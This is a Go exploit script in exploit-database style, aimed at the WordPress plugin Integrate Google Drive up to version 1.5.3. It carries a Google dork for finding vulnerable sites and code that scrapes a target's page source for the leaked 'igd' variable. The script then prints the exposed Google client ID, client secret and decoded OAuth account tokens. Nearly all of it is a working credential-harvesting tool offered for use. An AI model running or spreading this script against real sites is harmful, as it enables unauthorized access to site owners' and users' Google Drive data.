package main

/*
# Exploit Title: WordPress Plugin Integrate Google Drive 1.5.3 - Information Disclosure
# Google Dork: inurl:"/wp-content/plugins/integrate-google-drive"
# Date: 2025-12-21
# Exploit Author: Meysam Bal-afkan
# Vendor Homepage: https://wordpress.org/plugins/integrate-google-drive/
# Software Link: https://downloads.wordpress.org/plugin/integrate-google-drive.1.5.3.zip
# Version: Up to 1.5.3
# Tested on: Linux / Windows (Go Environment)
# CVE: CVE-2025-12139
#
# Description:
# The plugin exposes sensitive information including Google Client ID, Secret, and OAuth tokens
# via the 'wp_localize_script' function which outputs the 'igd' variable in the page source.
# Unauthenticated attackers can parse this data to gain unauthorized access to connected Google Drives.
*/

import (
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"regexp"
	"time"
)

// IgdData maps the JSON structure of the leaked 'igd' variable
type IgdData struct {
	Settings map[string]interface{} `json:"settings"`
	Accounts interface{}            `json:"accounts"` // Can be a Base64 string or an object
}

func printBanner() {
	fmt.Println(`
    ____                      __   _   __     __ 
   / __ \________  ____ _____/ /  / | / /__  / /_
  / / / / ___/ _ \/ __  / __  /  /  |/ / _ \/ __/
 / /_/ / /  /  __/ /_/ / /_/ /  / /|  /  __/ /_  
/_____/_/   \___/\__,_/\__,_/  /_/ |_/\___/\__/  `)

	fmt.Println("")
	fmt.Println("Telegram: t.me/Dread_Net")
	fmt.Println("")
}

func main() {
	// Parse command line arguments
	targetURL := flag.String("u", "", "Target URL (e.g., https://target-site.com)")
	flag.Parse()

	printBanner()

	if *targetURL == "" {
		fmt.Println("Usage: go run integrate_google_drive_disclosure.go -u http://target.com")
		os.Exit(1)
	}

	fmt.Printf("[*] Starting exploit against: %s\n", *targetURL)

	// Setup HTTP client with timeout
	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Get(*targetURL)
	if err != nil {
		fmt.Printf("[-] Error connecting to target: %s\n", err)
		return
	}
	defer resp.Body.Close()

	body, _ := ioutil.ReadAll(resp.Body)
	bodyStr := string(body)

	// Regex to extract the 'igd' JSON object from the script tag
	re := regexp.MustCompile(`var\s+igd\s*=\s*({.*?});`)
	match := re.FindStringSubmatch(bodyStr)

	if len(match) < 2 {
		fmt.Println("[-] Pattern 'var igd' not found. Plugin might be inactive on this page.")
		return
	}

	jsonStr := match[1]
	fmt.Println("[+] Found 'igd' variable! Parsing JSON...")

	var data IgdData
	err = json.Unmarshal([]byte(jsonStr), &data)
	if err != nil {
		fmt.Printf("[-] JSON Parse Error: %s\n", err)
		return
	}

	vulnerabilityFound := false

	// Check for Client ID and Secret in Settings
	if data.Settings != nil {
		secret, hasSecret := data.Settings["clientSecret"].(string)
		clientId, hasID := data.Settings["clientID"].(string)

		if (hasSecret && secret != "") || (hasID && clientId != "") {
			vulnerabilityFound = true
			fmt.Println("\n[!] VULNERABILITY DETECTED (App Settings Exposed):")
			fmt.Printf("    Client ID:     %s\n", clientId)
			fmt.Printf("    Client Secret: %s\n", secret)
		}
	}

	// Check for OAuth Tokens in Accounts
	if data.Accounts != nil {
		switch v := data.Accounts.(type) {
		case string:
			// "W10=" is Base64 for "[]" (empty array), ignore it.
			if len(v) > 0 && v != "W10=" {
				decoded, err := base64.StdEncoding.DecodeString(v)
				if err == nil {
					vulnerabilityFound = true
					fmt.Println("\n[!] VULNERABILITY DETECTED (Google Accounts Exposed):")
					fmt.Printf("    Raw Accounts Data: %s\n", string(decoded))
				}
			} else {
				fmt.Printf("\n[-] Accounts array is empty (Base64: %s). Check Settings section above.\n", v)
			}
		}
	}

	if !vulnerabilityFound {
		fmt.Println("[-] STATUS: NOT VULNERABLE (Or no sensitive data found yet)")
	} else {
		fmt.Println("[+] STATUS: TARGET IS VULNERABLE!")
	}
}